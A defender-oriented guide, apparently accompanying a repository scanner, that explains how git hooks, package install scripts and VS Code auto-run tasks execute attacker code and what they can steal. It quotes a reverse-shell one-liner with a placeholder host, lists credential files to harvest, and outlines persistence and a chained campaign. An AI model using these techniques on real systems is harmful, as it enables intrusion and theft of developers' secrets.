# Attack vectors: what these hooks can do to you

Companion to [`demo/`](./demo/README.md). That fixture is inert; this
document explains what the **same vectors** do with live payloads, and
what an attacker actually walks away with. Written for defenders —
know what you're scanning for.

## The core idea

Every vector below abuses the same trust gap: **code that runs without
you deciding to run it**, inheriting your user, your environment
variables, and your files. You think you're checking out a branch,
installing dependencies, or opening a folder. The attacker's code runs
first, silently, with everything you can touch.

## 1. Git hooks (`.git/hooks/*`)

**Trigger:** any matching git operation — `clone` + `checkout`
(`post-checkout`), `commit` (`pre-commit`), `push` (`pre-push`),
`merge`, `rebase`, even some GUI refreshes. No prompt, no output
unless the payload prints any.

**Why it's nasty:** hooks shipped in a cloned repo are *not* the issue
(git doesn't transport them) — the issue is archives, USB sticks,
course VMs, and "starter repos" distributed as zips/tarballs, which
carry a ready-made `.git/` directory, executable bit included.

**What the attacker gets:**

- **Reverse shell** (`bash -i >& /dev/tcp/<ip>/<port>`) — interactive
  terminal as you, from anywhere. Full game over.
- **Credential harvest in one line** — `~/.ssh/` (GitHub/AWS/server
  keys), `~/.aws/credentials`, `~/.kube/config` (production clusters),
  `~/.gnupg`, `~/.git-credentials`, `~/.netrc`, shell histories
  (`~/.bash_history`, `~/.zsh_history` — full of pasted secrets),
  `.env` files in every project on disk.
- **Token theft** — `~/.npmrc` / `~/.config/npm`, `~/.pypirc`,
  `GH_TOKEN`/`GITHUB_TOKEN` from env, `~/.docker/config.json`
  (registry creds), Slack/AWS keys from env and dotfiles.
- **Persistence** — append to `~/.bashrc` / `~/.zshrc` /
  `~/.profile`, install a cron job or systemd user unit, drop an SSH
  key into `~/.ssh/authorized_keys`. Survives deleting the repo.
- **Lateral movement** — your SSH keys + `known_hosts` tell them
  exactly which servers you can reach; agent forwarding (`SSH_AUTH_SOCK`)
  lets them ride your loaded keys without even stealing the files.

## 2. Package lifecycle scripts (`package.json`, `setup.py`, …)

**Trigger:** `npm install` / `pip install` — the single most reflexive
command in a developer's day. `preinstall`/`install`/`postinstall`
(npm) and `setup.py` `cmdclass` (pip) execute arbitrary code at install
time, before you ever read a line of the actual project.

**Why it's nasty:** dependency installation is perceived as safe
plumbing, and lockfiles (`package-lock.json`) don't cover install
scripts of the top-level project at all. Typosquats and trojaned
updates use the identical mechanism one dependency down.

**What the attacker gets:** everything in §1 (same user, same files),
plus supply-chain flavored extras:

- **Build-environment secrets** — CI env vars (`NPM_TOKEN`,
  `PYPI_TOKEN`, cloud keys, signing keys) when the install runs in CI.
- **Source tampering** — patch the package being installed so the
  backdoor persists in the built artifact, not just at install time.
- **Dependency confusion follow-ups** — scan internal registries and
  exfiltrate private package names for the next campaign.

## 3. IDE auto-run tasks (`.vscode/tasks.json`)

**Trigger:** opening the folder in VS Code with `"runOn": "folderOpen"`.
Developers open unfamiliar folders in their main editor constantly.

**Why it's nasty:** it fires outside any terminal or package manager —
nothing the victim types is required. The task runs with a full user
session (keychain/secret-service often unlocked).

**What the attacker gets:** same harvest as §1, plus:

- **Desktop-session access** — VS Code tasks inherit the GUI session:
  secret stores, VPN-connected network position, mounted shares.
- **Workspace trust bypass history** — users trained to click "trust
  this workspace" once will do it again; the task then runs on every
  open, giving repeated execution and a durable foothold signal.

## 4. Chaining it together (the realistic campaign)

Real operations don't pick one vector — they stack them so *any*
reasonable first action compromises the box:

1. Victim unzips the "assignment" → `.git/hooks/post-checkout` armed.
2. First `git checkout` → reverse shell + credential archive exfiltrated.
3. Victim runs `npm install` → `postinstall` re-arms persistence
   (`~/.bashrc` line) in case hooks get noticed.
4. Victim opens the folder in VS Code → `folderOpen` task phones home
   with a "still here" beacon and desktop context.
5. Attacker pivots with stolen SSH keys while the victim debugs why
   their checkout "hangs sometimes".

Total victim interaction required: **zero suspicious commands.**

## What to do about it

- Never `checkout` / `install` / open unfamiliar projects on your main
  machine or main user. Use a disposable VM or container.
- Scan first: `git-smells-wrong scan --archive=./take-home.zip`
  catches all four vectors above without executing anything.
- Treat performance oddities (hanging checkouts, slow installs,
  fan spin on folder open) as compromise indicators, not annoyances.
- Rotate anything the box could reach if you slipped once: SSH keys,
  cloud tokens, registry creds — assume harvest, not just access.
